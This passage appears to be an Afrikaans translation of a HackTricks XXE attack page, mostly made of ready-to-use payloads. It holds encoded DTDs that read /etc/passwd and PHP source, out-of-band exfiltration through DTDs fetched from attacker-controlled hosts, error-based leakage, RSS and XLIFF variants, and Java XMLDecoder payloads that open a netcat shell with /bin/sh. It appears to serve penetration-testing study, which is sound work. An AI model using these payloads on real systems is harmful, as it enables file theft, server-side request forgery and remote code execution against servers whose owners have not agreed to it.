+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Lêer:/ Protokol Oorspring Vermyding

As die web PHP gebruik, kan jy in plaas van `file:/` **php wrappers** `php://filter/convert.base64-encode/resource=` gebruik om **interne lêers te ontsluit**.

As die web Java gebruik, kan jy die [**jar: protokol**](xxe-xee-xml-external-entity.md#jar-protocol) nagaan.

### HTML Entiteite

Truuk vanaf [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Jy kan 'n **entiteit binne 'n entiteit** skep deur dit te enkodeer met **HTML entiteite** en dit dan oproep om 'n dtd te **laai**.\
Let daarop dat die gebruikte **HTML Entiteite** **numeries** moet wees (soos \[in hierdie voorbeeld]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD-voorbeeld:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

In hierdie voorbeeld word 'n DTD (Document Type Definition) gebruik om 'n entiteit genaamd "xxe" te definieer. Die entiteit verwys na die lêer "/etc/passwd" op die bediener. Die entiteit word dan ingesluit in die XML-dokument deur dit binne die "foo" element te plaas. Hierdie tegniek kan gebruik word om toegang te verkry tot gevoelige inligting op die bediener, soos gebruikersname en wagwoorde.
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**Onttrek** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Onttrek eksterne bron**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Verrekenaar-kode-uitvoering

**As PHP "expect" module gelaai is**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

SOAP (Simple Object Access Protocol) is a protocol used for exchanging structured information in web services. It relies on XML (eXtensible Markup Language) for message formatting.

One common vulnerability in SOAP is XML External Entity (XXE) attacks. These attacks exploit the ability of XML parsers to process external entities, which are references to external resources such as files or URLs.

An XXE attack occurs when an attacker can control the content of an XML document and inject a malicious external entity reference. This can lead to various security risks, including information disclosure, server-side request forgery (SSRF), and remote code execution.

To perform an XXE attack, an attacker typically crafts a malicious XML payload that includes an external entity reference pointing to a sensitive file or a malicious URL. When the XML is processed by the server, the external entity is resolved, and its content is included in the response.

There are several techniques to mitigate XXE attacks, such as disabling external entity processing, using whitelists to restrict the allowed entities, and validating and sanitizing user input.

It is important for developers and security professionals to be aware of the risks associated with XXE attacks and to implement proper security measures to prevent them.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Hierdie voorbeeld is geïnspireer deur [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) word gebruik om data-uitruiling in lokalisasieprosesse te standaardiseer. Dit is 'n op XML-gebaseerde formaat wat hoofsaaklik gebruik word vir die oordrag van lokaliseerbare data tussen gereedskap tydens lokalisering en as 'n algemene uitruilformaat vir CAT (Computer-Aided Translation) gereedskap.

### Blinde Versoekanalise

'n Versoek word na die bediener gestuur met die volgende inhoud:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Egter, hierdie versoek veroorsaak 'n interne bedienerfout, wat spesifiek 'n probleem met die merkverklarings aandui:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Ten spyte van die fout, word 'n tref op Burp Collaborator aangeteken, wat dui op 'n sekere vlak van interaksie met die eksterne entiteit.

Uitbanddata-eksfiltrering
Om data te eksfiltreer, word 'n gewysigde versoek gestuur:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Hierdie benadering onthul dat die Gebruiker Agent die gebruik van Java 1.8 aandui. 'n Bekende beperking met hierdie weergawe van Java is die onvermoë om lêers wat 'n nuwe lyn karakter bevat, soos /etc/passwd, te herwin deur die Out of Band-tegniek te gebruik.

Fout-Gebaseerde Data Uitlekking
Om hierdie beperking te oorkom, word 'n Fout-Gebaseerde benadering gebruik. Die DTD-lêer is as volg gestruktureer om 'n fout te veroorsaak wat data van 'n teikengewenste lêer insluit:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Die bediener reageer met 'n fout, wat belangrik is om die nie-bestaande lêer te weerspieël, wat aandui dat die bediener probeer om toegang tot die gespesifiseerde lêer te verkry:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Om die inhoud van die lêer in die foutboodskap in te sluit, word die DTD-lêer aangepas:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Hierdie wysiging lei tot die suksesvolle uitlek van die lêer se inhoud, soos weerspieël in die foutuitset wat via HTTP gestuur word. Dit dui op 'n suksesvolle XXE (XML Eksterne Entiteit) aanval, wat beide Out of Band en Fout-Gebaseerde tegnieke gebruik om sensitiewe inligting te onttrek.


## RSS - XEE

Geldige XML met RSS-formaat om 'n XXE kwesbaarheid uit te buit.

### Ping terug

Eenvoudige HTTP-versoek na aanvallers se bediener
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Lees lêer

Om 'n lêer te lees, kan jy die volgende XML-entiteit gebruik:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "lêerpad">]>
```

Vervang "lêerpad" met die pad na die lêer wat jy wil lees. Byvoorbeeld:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

Hierdie entiteit sal die lêerinhoud in die XML-respons insluit.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Lees bronkode

Deur die gebruik van PHP base64 filter
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE na RCE

XMLDecoder is 'n Java-klas wat voorwerpe skep gebaseer op 'n XML-boodskap. As 'n skadelike gebruiker 'n aansoek kan oortuig om willekeurige data te gebruik in 'n oproep na die metode **readObject**, sal hy onmiddellik kode-uitvoering op die bediener verkry.

### Gebruik van Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

Die `ProcessBuilder`-klas in Java word gebruik om 'n nuwe proses te skep en te bestuur. Dit bied 'n eenvoudige manier om eksterne programme van binne 'n Java-program uit te voer. Die `ProcessBuilder`-klas kan gebruik word om 'n nuwe proses te skep deur 'n lys van opdragreëls te spesifiseer. Hier is 'n voorbeeld van hoe om die `ProcessBuilder`-klas te gebruik:

```java
ProcessBuilder processBuilder = new ProcessBuilder("command1", "command2", "command3");
Process process = processBuilder.start();
```

In hierdie voorbeeld word 'n nuwe proses geskep deur die opdragreëls "command1", "command2" en "command3" te spesifiseer. Die `start()`-metode word dan gebruik om die proses uit te voer.

Die `ProcessBuilder`-klas bied ook 'n paar nuttige metodes om die proses te bestuur. Byvoorbeeld, die `directory(File directory)`-metode kan gebruik word om die werkverrigting van die proses te spesifiseer, en die `redirectOutput(File file)`-metode kan gebruik word om die uitset van die proses na 'n lêer om te lei.

Dit is belangrik om te verseker dat die opdragreëls wat aan die `ProcessBuilder`-klas verskaf word, veilig is en nie gevaarlike opdragte of skadelike kodes bevat nie. Dit is omdat 'n aanvaller die `ProcessBuilder`-klas kan misbruik om skadelike opdragte op die stelsel uit te voer.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Gereedskap

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Verwysings

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* Haal inligting uit via HTTP deur eie eksterne DTD te gebruik: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
